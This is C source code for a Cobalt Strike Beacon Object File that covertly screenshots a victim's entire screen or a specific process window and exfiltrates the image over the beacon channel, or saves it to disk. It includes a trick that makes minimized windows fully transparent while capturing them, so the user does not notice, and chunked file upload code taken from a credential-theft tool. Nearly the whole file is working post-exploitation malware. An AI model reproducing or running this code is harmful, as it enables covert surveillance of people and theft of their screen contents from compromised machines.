#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "bofdefs.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")

/*-------------------------------------------------------------
   Typedefs for the winapis im dynamically resolving
-------------------------------------------------------------*/
typedef HDC(WINAPI* PFN_CreateDCA)(LPCSTR, LPCSTR, LPCSTR, const DEVMODEA*);
typedef int     (WINAPI* PFN_GetDeviceCaps)(HDC, int);
typedef BOOL(WINAPI* PFN_DeleteDC)(HDC);
typedef int     (WINAPI* PFN_GetObjectA)(HANDLE, int, LPVOID);
typedef HGDIOBJ(WINAPI* PFN_GetStockObject)(int);
typedef HDC(WINAPI* PFN_GetDC)(HWND);
typedef int     (WINAPI* PFN_ReleaseDC)(HWND, HDC);
typedef HDC(WINAPI* PFN_CreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI* PFN_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI* PFN_SelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI* PFN_PrintWindow)(HWND, HDC, UINT);
typedef BOOL(WINAPI* PFN_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL(WINAPI* PFN_ShowWindow)(HWND, int);
typedef LONG(WINAPI* PFN_SetWindowLongA)(HWND, int, LONG);
typedef BOOL(WINAPI* PFN_SetLayeredWindowAttributes)(HWND, COLORREF, BYTE, DWORD);
typedef BOOL(WINAPI* PFN_UpdateWindow)(HWND);
typedef VOID(WINAPI* PFN_Sleep)(DWORD);
typedef BOOL(WINAPI* PFN_GetWindowRect)(HWND, LPRECT);
typedef HANDLE(WINAPI* PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* PFN_WriteFile) (HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);
typedef HGLOBAL(WINAPI* PFN_GlobalAlloc)(UINT, SIZE_T);
typedef LPVOID(WINAPI* PFN_GlobalLock)(HGLOBAL);
typedef BOOL(WINAPI* PFN_GlobalUnlock)(HGLOBAL);
typedef HGLOBAL(WINAPI* PFN_GlobalFree)(HGLOBAL);
typedef BOOL(WINAPI* PFN_GetWindowPlacement)(HWND, WINDOWPLACEMENT*);
typedef DWORD(WINAPI* PFN_GetWindowThreadProcessId)(HWND, LPDWORD);
typedef BOOL(WINAPI* PFN_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int     (WINAPI* PFN_GetSystemMetrics)(int);
typedef BOOL(WINAPI* PFN_SetWindowPos)(HWND, HWND, int, int, int, int, UINT);
typedef BOOL(WINAPI* PFN_DeleteObject)(HGDIOBJ);
typedef HGDIOBJ(WINAPI* PFN_SelectPalette)(HDC, HPALETTE, BOOL);
typedef UINT(WINAPI* PFN_RealizePalette)(HDC);
typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);

/*-------------------------------------------------------------
   Declare static pointers for each API
-------------------------------------------------------------*/
static PFN_CreateDCA              pCreateDC = NULL;
static PFN_GetDeviceCaps          pGetDeviceCaps = NULL;
static PFN_DeleteDC               pDeleteDC = NULL;
static PFN_GetObjectA             pGetObjectA = NULL;
static PFN_GetStockObject         pGetStockObject = NULL;
static PFN_GetDC                  pGetDC = NULL;
static PFN_ReleaseDC              pReleaseDC = NULL;
static PFN_CreateCompatibleDC     pCreateCompatibleDC = NULL;
static PFN_CreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
static PFN_SelectObject           pSelectObject = NULL;
static PFN_PrintWindow            pPrintWindow = NULL;
static PFN_BitBlt                 pBitBlt = NULL;
static PFN_ShowWindow             pShowWindow = NULL;
static PFN_SetWindowLongA         pSetWindowLongA = NULL;
static PFN_SetLayeredWindowAttributes pSetLayeredWindowAttributes = NULL;
static PFN_UpdateWindow           pUpdateWindow = NULL;
static PFN_Sleep                  pSleep = NULL;
static PFN_GetWindowRect          pGetWindowRect = NULL;
static PFN_CreateFileA            pCreateFileA = NULL;
static PFN_WriteFile              pWriteFile = NULL;
static PFN_CloseHandle            pCloseHandle = NULL;
static PFN_GlobalAlloc            pGlobalAlloc = NULL;
static PFN_GlobalLock             pGlobalLock = NULL;
static PFN_GlobalUnlock           pGlobalUnlock = NULL;
static PFN_GlobalFree             pGlobalFree = NULL;
static PFN_GetWindowPlacement     pGetWindowPlacement = NULL;
static PFN_GetWindowThreadProcessId pGetWindowThreadProcessId = NULL;
static PFN_EnumWindows            pEnumWindows = NULL;
static PFN_GetSystemMetrics       pGetSystemMetrics = NULL;
static PFN_SetWindowPos           pSetWindowPos = NULL;
static PFN_DeleteObject           pDeleteObject = NULL;
static PFN_SelectPalette          pSelectPalette = NULL;
static PFN_RealizePalette         pRealizePalette = NULL;
static PFN_GetDIBits              pGetDIBits = NULL;
static PFN_IsWindowVisible        pIsWindowVisible = NULL;

/*-------------------------------------------------------------
   Dynamically resolve the required WinAPI functions to func ptrs

   for some reason cobalt has a limit to how many winapis you can use via DFR lol.
   https://github.com/fortra/No-Consolation/issues/5
   the limit is 32 on 4.9 and 128 on 4.10. To make this 4.9 friendly i had to do this :sob:
-------------------------------------------------------------*/
void ResolveAPIs(void)
{
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");

    pCreateDC = (PFN_CreateDCA)GetProcAddress(hGdi32, "CreateDCA");
    pGetDeviceCaps = (PFN_GetDeviceCaps)GetProcAddress(hGdi32, "GetDeviceCaps");
    pDeleteDC = (PFN_DeleteDC)GetProcAddress(hGdi32, "DeleteDC");
    pGetObjectA = (PFN_GetObjectA)GetProcAddress(hGdi32, "GetObjectA");
    pGetStockObject = (PFN_GetStockObject)GetProcAddress(hGdi32, "GetStockObject");
    pGetDC = (PFN_GetDC)GetProcAddress(hUser32, "GetDC");
    pReleaseDC = (PFN_ReleaseDC)GetProcAddress(hUser32, "ReleaseDC");
    pCreateCompatibleDC = (PFN_CreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
    pCreateCompatibleBitmap = (PFN_CreateCompatibleBitmap)GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    pSelectObject = (PFN_SelectObject)GetProcAddress(hGdi32, "SelectObject");
    pPrintWindow = (PFN_PrintWindow)GetProcAddress(hUser32, "PrintWindow");
    pBitBlt = (PFN_BitBlt)GetProcAddress(hGdi32, "BitBlt");
    pShowWindow = (PFN_ShowWindow)GetProcAddress(hUser32, "ShowWindow");
    pSetWindowLongA = (PFN_SetWindowLongA)GetProcAddress(hUser32, "SetWindowLongA");
    pSetLayeredWindowAttributes = (PFN_SetLayeredWindowAttributes)GetProcAddress(hUser32, "SetLayeredWindowAttributes");
    pUpdateWindow = (PFN_UpdateWindow)GetProcAddress(hUser32, "UpdateWindow");
    pSleep = (PFN_Sleep)GetProcAddress(hKernel32, "Sleep");
    pGetWindowRect = (PFN_GetWindowRect)GetProcAddress(hUser32, "GetWindowRect");
    pCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    pWriteFile = (PFN_WriteFile)GetProcAddress(hKernel32, "WriteFile");
    pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    pGlobalAlloc = (PFN_GlobalAlloc)GetProcAddress(hKernel32, "GlobalAlloc");
    pGlobalLock = (PFN_GlobalLock)GetProcAddress(hKernel32, "GlobalLock");
    pGlobalUnlock = (PFN_GlobalUnlock)GetProcAddress(hKernel32, "GlobalUnlock");
    pGlobalFree = (PFN_GlobalFree)GetProcAddress(hKernel32, "GlobalFree");
    pGetWindowPlacement = (PFN_GetWindowPlacement)GetProcAddress(hUser32, "GetWindowPlacement");
    pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetProcAddress(hUser32, "GetWindowThreadProcessId");
    pEnumWindows = (PFN_EnumWindows)GetProcAddress(hUser32, "EnumWindows");
    pGetSystemMetrics = (PFN_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
    pSetWindowPos = (PFN_SetWindowPos)GetProcAddress(hUser32, "SetWindowPos");
    pDeleteObject = (PFN_DeleteObject)GetProcAddress(hGdi32, "DeleteObject");
    pSelectPalette = (PFN_SelectPalette)GetProcAddress(hGdi32, "SelectPalette");
    pRealizePalette = (PFN_RealizePalette)GetProcAddress(hGdi32, "RealizePalette");
    pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
    pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");


    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Resolved hKernel32 to 0x%p", hKernel32);
    

}

/*-------------------------------------------------------------
  i stole this from https://github.com/anthemtotheego/CredBandit
  thanks @anthemtotheego :D

  it downloads a file over beacon
-------------------------------------------------------------*/
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    // No WinAPI calls here; your MSVCRT and Beacon functions remain as-is
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    /* Pack fileId (4 bytes) */
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    /* Pack fileSize (4 bytes) */
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex++] = fileName[i];
    }
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    int chunkSize = 1024 * 900;
    if (fileSize > chunkSize) {
        int index = 0;
        while (index < fileSize) {
            if (fileSize - index > chunkSize) {
                int chunkLength = 4 + chunkSize;
                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
                packedChunk[0] = (fileId >> 24) & 0xFF;
                packedChunk[1] = (fileId >> 16) & 0xFF;
                packedChunk[2] = (fileId >> 8) & 0xFF;
                packedChunk[3] = fileId & 0xFF;
                int chunkIndex = 4;
                for (int i = index; i < index + chunkSize; i++) {
                    packedChunk[chunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
                free(packedChunk);
            }
            else {
                int lastChunkLength = fileSize - index + 4;
                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);
                lastChunk[0] = (fileId >> 24) & 0xFF;
                lastChunk[1] = (fileId >> 16) & 0xFF;
                lastChunk[2] = (fileId >> 8) & 0xFF;
                lastChunk[3] = fileId & 0xFF;
                int lastChunkIndex = 4;
                for (int i = index; i < fileSize; i++) {
                    lastChunk[lastChunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
                free(lastChunk);
            }
            index += chunkSize;
        }
    }
    else {
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex++] = returnData[i];
        }
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
        free(packedChunk);
    }

    char packedClose[4];
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    free(packedData);
}

/*-------------------------------------------------------------
  Saves (or downloads) the given HBITMAP as a BMP file with
  the provided file name.
-------------------------------------------------------------*/
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
{
    ResolveAPIs();

    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh;
    HANDLE hDib, hPal;
    HGDIOBJ hOldPal2 = NULL;

    hDC = pCreateDC("DISPLAY", NULL, NULL, NULL);
    iBits = pGetDeviceCaps(hDC, BITSPIXEL) * pGetDeviceCaps(hDC, PLANES);
    pDeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;

    pGetObjectA(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    /* Negative height makes the bitmap top–down */
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;

    dwBmBitsSize = (((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8) * Bitmap0.bmHeight;
    hDib = pGlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)pGlobalLock(hDib);
    *lpbi = bi;

    hPal = pGetStockObject(DEFAULT_PALETTE);
    if (hPal) {
        HDC hDC2 = pGetDC(NULL);
        hOldPal2 = pSelectPalette(hDC2, (HPALETTE)hPal, FALSE);
        pRealizePalette(hDC2);
        // Do not forget to release DC later.
        pReleaseDC(NULL, hDC2);
    }

    // GetDIBits: use our dynamically resolved function
    hDC = pGetDC(NULL);
    pGetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight,
        (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize,
        (BITMAPINFO*)lpbi, DIB_RGB_COLORS);
    pReleaseDC(NULL, hDC);

    bmfHdr.bfType = 0x4D42;  /* 'BM' */
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    void* bmpdata = malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
    memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
    memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);

    if (savemethod == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving bitmap to disk with filename %s", lpszFileName);
        fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (fh == INVALID_HANDLE_VALUE)
            return FALSE;
        pWriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, &dwWritten, NULL);
        pCloseHandle(fh);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading bitmap over beacon with filename %s", lpszFileName);
        downloadFile((char*)lpszFileName, (int)strlen(lpszFileName),
            (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
    }

    pGlobalUnlock(hDib);
    pGlobalFree(hDib);
    free(bmpdata);
    return TRUE;
}

/*-------------------------------------------------------------
  Callback for EnumWindows. It gets a window handle from a PID
-------------------------------------------------------------*/
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    /* lParam points to a two–element array:
       index 0: the target PID (stored as LONG_PTR)
       index 1: the found window handle (initially 0)
    */
    LONG_PTR* params = (LONG_PTR*)lParam;
    DWORD targetPid = (DWORD)params[0];
    DWORD windowPid = 0;
    pGetWindowThreadProcessId(hwnd, &windowPid);
    if (windowPid == targetPid && IsWindowVisible(hwnd)) {
        params[1] = (LONG_PTR)hwnd;
        return FALSE;
    }
    return TRUE;
}

/*-------------------------------------------------------------
  Given a PID, uses EnumWindows to find a matching
  window handle.
-------------------------------------------------------------*/
HWND FindWindowByPID(DWORD pid, int debug)
{
    ResolveAPIs();
    LONG_PTR params[2];
    params[0] = (LONG_PTR)pid;
    params[1] = 0;
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Enumerating windows for PID %d", pid);
    EnumWindows(EnumWindowsProc, (LPARAM)&params);
    if (debug) {
        if ((HWND)params[1])
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found window handle: 0x%p", (HWND)params[1]);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] No window found for PID %d", pid);
    }
    return (HWND)params[1];
}

/*-------------------------------------------------------------
  Captures the given window (by hwnd) into an HBITMAP.
  If the window is minimized, it is temporarily restored.
-------------------------------------------------------------*/
HBITMAP CaptureWindow(HWND hwnd, int debug)
{
    ResolveAPIs();
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Starting CaptureWindow for hwnd 0x%p", hwnd);

    WINDOWPLACEMENT wp = { 0 };
    wp.length = sizeof(WINDOWPLACEMENT);
    if (!pGetWindowPlacement(hwnd, &wp)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowPlacement failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window showCmd: %d", wp.showCmd);

    RECT captureRect;
    int width, height;
    BOOL success = FALSE;
    HDC hdcScreen = pGetDC(NULL);
    HDC hdcMem = pCreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = NULL;

    if (wp.showCmd == SW_SHOWMINIMIZED) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window is minimized; restoring temporarily for capture");

        LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
        pSetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
        pShowWindow(hwnd, SW_RESTORE);
        pUpdateWindow(hwnd);
        pSleep(500);  /* Allow time for rendering */

        if (!pGetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed (restored window)");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Restored window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        pSelectObject(hdcMem, hBitmap);
        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = pBitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
        /* Restore window state */
        pShowWindow(hwnd, SW_MINIMIZE);
        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle);
        pSetWindowPos(hwnd, NULL, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    }
    else {
        if (!pGetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        pSelectObject(hdcMem, hBitmap);

        /* Attempt to use PrintWindow to capture the full contents,
           even if the window is in the background */
        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = pBitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
    }

cleanup:
    if (hdcMem)
        pDeleteDC(hdcMem);
    if (hdcScreen)
        pReleaseDC(NULL, hdcScreen);
    if (!success) {
        if (hBitmap)
            pDeleteObject(hBitmap);
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow succeeded");
    return hBitmap;
}

/*-------------------------------------------------------------
  go:
  BOF args:
    1. Filename 
    2. Save method: 0 = save to disk, 1 = download via Beacon.
    3. PID: if nonzero, capture that window; if zero, capture the full screen.
-------------------------------------------------------------*/
#ifdef BOF
int debug = 0; // enable the debugging prints
void go(char* buff, int len)
{
    ResolveAPIs();  // ensure API pointers are resolved

    datap parser;
    BeaconDataParse(&parser, buff, len);

    char* filename = BeaconDataExtract(&parser, NULL);
    int savemethod = BeaconDataInt(&parser);
    int pid = BeaconDataInt(&parser);


    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT,"[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, debug: %d",filename, savemethod, pid, debug);

    HBITMAP hBitmap = NULL;
    if (pid != 0) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Attempting to capture window for PID %d", pid);
        HWND hwnd = FindWindowByPID((DWORD)pid, debug);
        if (hwnd == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Window with PID %d not found", pid);
            return;
        }
        hBitmap = CaptureWindow(hwnd, debug);
        if (hBitmap == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to capture window with PID %d", pid);
            return;
        }
    }
    else {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Capturing full screen");
        int x1 = pGetSystemMetrics(SM_XVIRTUALSCREEN);
        int y1 = pGetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = pGetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = pGetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hScreen = pGetDC(NULL);
        HDC hDC = pCreateCompatibleDC(hScreen);
        hBitmap = pCreateCompatibleBitmap(hScreen, w, h);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
            pReleaseDC(NULL, hScreen);
            pDeleteDC(hDC);
            return;
        }
        HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
        if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture");
        pSelectObject(hDC, old_obj);
        pDeleteDC(hDC);
        pReleaseDC(NULL, hScreen);
    }

    if (hBitmap) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Captured bitmap successfully; saving/downloading as %s", filename);
        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save bitmap");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Screenshot saved/downloaded as %s", filename);
        pDeleteObject(hBitmap);
    }
}
#else
void main(int argc, char* argv[])
{
    /* Non-BOF main() implementation (if needed) */
}
#endif
